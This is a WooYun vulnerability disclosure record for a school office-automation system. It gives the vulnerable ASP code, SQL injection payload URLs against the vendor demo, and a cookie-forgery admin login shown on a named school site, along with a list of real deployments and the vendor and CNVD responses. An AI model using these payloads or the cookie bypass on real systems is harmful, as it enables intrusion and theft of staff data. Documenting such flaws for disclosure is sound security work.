{"id": 1984, "wybug_id": "wooyun-2014-061600", "wybug_title": "某OA系统越权、多处SQL注入及任意用户登陆包括管理员（无需登录）", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "xfkxfk", "wybug_date": "2014-05-20 15:17", "wybug_open_date": "2014-08-18 15:18", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "设计缺陷", "敏感接口缺乏校验", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-18：\t细节向公众公开  简要描述： 大量案例中招，官网demo中招，多处漏洞 详细说明：  广州市颖峰信息科技有限公司http://www.yfidea.com/product.asp官方demo地址：http://demo.yfidea.com/官方成功案例：http://www.yfidea.com/AnLi.aspGoogle搜索案例：Google关键字：技术支持：创想颖峰搜索结果：43,400从官网和搜索结果中看，用户还是很多的。http://oa.bh5z.net/Index.asphttp://222.178.145.174:8000/Index.asphttp://oa.gz65.com/http://hsoa.bgyhs.net/http://www.xmqwzx.com/Index.asphttp://oa.lhljzx.com/......使用此OA的都是学校和教育部门，用户量很多，影响范围不小。   漏洞证明：  0x001 越权访问+SQL注入第一处SQL注入文件/OA/varset/modify.asp\n<p>  <%strId=request(\"id\") tname=request(\"tname\")Set rs=Server.CreateObject(\"Adodb.Recordset\")sql=\"select * from varset where     ID='\"&strID& \"'\"rs.open sql,conn,1,1%></p>\n注入地址：http://demo.yfidea.com/OA/varset/modify.asp?tname=bumenfile&id=-202' UNION ALL SELECT 1,2,3,db_name(),5,6,7--第二处SQL注入文件/OA/varset/modifyqishu.asp\n<p>  <%   strId=request(\"id\")   tname=request(\"tname\")   Set rs=Server.CreateObject(\"Adodb.Recordset\")   sql=\"select * from varset where     ID='\"&strID& \"'\"   rs.open sql,conn,1,1   %>\n注入地址：http://demo.yfidea.com/OA/varset/modifyqishu.asp?tname=bumenfile&id=-202' UNION ALL SELECT 1,2,3,db_name(),5,6,7--第三处SQL注入文件/OA/varset/modifysubject.asp\n<p>  <%strId=request(\"id\") tname=request(\"tname\")Set rs=Server.CreateObject(\"Adodb.Recordset\")sql=\"select * from varset where     ID='\"&strID& \"'\"rs.open sql,conn,1,1%>\n注入地址：http://demo.yfidea.com/OA/varset/modifysubject.asp?tname=bumenfile&id=-8892' UNION ALL SELECT 1,2,3,db_name(),5,6,7--第四，五处SQL注入文件/OA/varset/modifysys.asp\n<p>  <%   var=request(\"var\")   vargroup=request(\"vargroup\")     set Rsvar= Conn.Execute(\"select * from varset where  name='\"&var&\"'\")\t    %></p><p>　</p><p>　</p><form id=\"form3\" name=\"form3\" method=\"post\" action=\"savemodifysys.asp?var=<%=var%>&vargroup=<%=vargroup%>\"  onSubmit=\"return form_check();\">  <p>　</p>  <table width=\"442\" border=\"0\" align=\"center\" cellspacing=\"0\" bordercolorlight=\"#11b1ff\" bordercolordark=\"#f0f8ff\">        <tr align=\"middle\">      <td width=\"64\" class=\"STYLE1\">　</td>      <td width=\"61\" height=\"41\" class=\"STYLE1\"><div align=\"right\">参数</div></td>      <td width=\"315\" align=\"center\" valign=\"middle\" class=\"STYLE1\"><div align=\"left\">        <select name=\"vname\" id=\"vname\">          <option><%=Rsvar( \"vname\" )%></option>          <% Set RSsel = Conn.Execute(\"select * from varset where  name='\"&vargroup& \"'  order by vid\" )                   While NOT RSsel.EOF %>          <option value=\"<%=RSsel( \"vname\" )%>\"><%=RSsel( \"vname\" )%></option>          <% RSsel.MoveNext                  Wend\t\t\t\t  %>        </select>        <input name=\"Submit\" type=\"submit\" class=\"topanniu\" value=\"保存修改\" />        </div>      </label></td>      <td width=\"8\">　</td>    </tr>  </table>  <p>　</p>  <p>　</p>  <p align=\"center\">说明：<%=Rsvar( \"shuoming\" )%></p>  <% RSsel.Close     Rsvar.close%></form>\nhttp://demo.yfidea.com/OA/varset/modifysys.asp?var=-123' UNION ALL SELECT 1,2,3,db_name(),5,6,7--&vargroup=456http://demo.yfidea.com/OA/varset/modifysys.asp?var=1&vargroup=-456' UNION ALL SELECT 1,2,3,db_name(),5,6,7--第六处SQL注入文件/OA/varset/modifytime.asp\n<p>  <%strId=request(\"id\") varname=request(\"varname\")Set rs=Server.CreateObject(\"Adodb.Recordset\")sql=\"select * from varset where     ID='\"&strID& \"'\"rs.open sql,conn,1,1%></p>\nhttp://demo.yfidea.com/OA/varset/modifytime.asp?tname=bumenfile&id=-202' UNION ALL SELECT 1,2,3,db_name(),5,6,7--第七处SQL注入文件/OA/keyan/newfile.asp\n<!--#include file=\"../SQLconn.asp\"--><% dim strIDstrId=request(\"id\")dim fjsqldim fjrsdim strfilenamefjsql=\"select * from wendangfile  where fid='\"&strId& \"'\"Set fjrs= Server.CreateObject(\"ADODB.Recordset\")fjrs.open fjsql,conn,1,1Response.ContentType = fjrs(\"fileContentType\")'Response.AddHeader   \"Content-Disposition\",\"attachment;   filename=\"&fjrs(\"filename\")Response.AddHeader   \"Content-Disposition\",\"inline;   filename=\"&fjrs(\"filename\")Response.BinaryWrite fjrs(\"filevalue\").getChunk(21212121) fjrs.closeset fjrs=nothing set conn=nothing %>\nhttp://demo.yfidea.com/OA/keyan/newfile.asp?id=7' and 'a'='a——下载文件http://demo.yfidea.com/OA/keyan/newfile.asp?id=7' and 'a'='b——无法下载文件第八出SQL注入+越权访问+信息泄露文件/OA/renshigongzi/modifyDangAn.asp\n<%   id=request(\"id\")   Set Rslist=Server.CreateObject(\"Adodb.Recordset\")   sqllist=\"select * from Employee where id='\"&ID& \"'\"   Rslist.open sqllist,conn,1,1   %>\nhttp://demo.yfidea.com/OA/renshigongzi/modifyDangAn.asp?id=1遍历id即可访问所有用户的档案信息，很详细的敏感信息http://demo.yfidea.com/OA/renshigongzi/modifyDangAn.asp?id=1' and 'a'='a显示正常http://demo.yfidea.com/OA/renshigongzi/modifyDangAn.asp?id=1' and 'a'='b显示错误，无回显0x002 任意用户登录文件/login.asp\n<%       strip=Request.ServerVariables(\"REMOTE_ADDR\")   Set MyOAASPObj = Server.CreateObject(\"YFSchoolOApro.YFSchoolDll\")    str=MyOAASPObj.OA_Login(strip)   set MyOAASPObj=nothing\t\t   \t\t\t  \tdim str1    str1=split(str,\"|\",-1,1)\tresponse.cookies(\"Tname\")=str1(0)\tresponse.cookies(\"imgdir\")=str1(1)\tresponse.cookies(\"nowxueqi\")=str1(2)\t \tresponse.cookies(\"filelength\")=10\t '这个1是表示上传文件的长度不能超过1M，控制整个系统的文件大小\tif  str1(3)=\"888\" then\t     response.redirect(\"OA/user/password.asp\")\telse\t    response.redirect(\"OA/Index.asp\")\tend if %>\n这里的登录认证虽然通过了核心的dll文件，此dll文件加密无法看到源码，但是我们看大这些数据都是通过cookie进行处理的，肯定存在问题。。再来看看/oa/checklogin.asp\n<% '登陆控制，防止未登录查看    if request.cookies(\"tname\")=\"\" then        response.redirect(\"../Index.asp\")     end if    %>\n只是判断是否存在cookies(\"tname\")来进行认证用户的访问权限。所以经过测试，我们在Cookie中添加tname=用户名，即可登陆此用户账户。以案例http://oa.bh5z.net为例添加cookie：tname=admin;即可登陆admin用户\n\n也可以添加cookie：imgdir=004hong;这是皮肤。至于用户名，我们可以从这里得到：http://oa.bh5z.net/oa/user/modifyuser.asp?iD=1824遍历这里的id就可以获取全部用户，登录任意用户了。   修复方案：  最主要的控制权限，过滤   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2014-05-25 09:17 厂商回复： CNVD确认并复现所述案例情况，先由CNVD通过公开联系渠道向软件生产厂商通报，对方确认测试网站修复。后续又下发给广东分中心继续跟踪处置，软件生产厂商反馈3.93版本已经修复。广东分中心经过仔细检测，确认仍然存在相关漏洞，目前仍然在进一步协调中。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-20 16:54 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  大牛，我又来膜拜你来了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}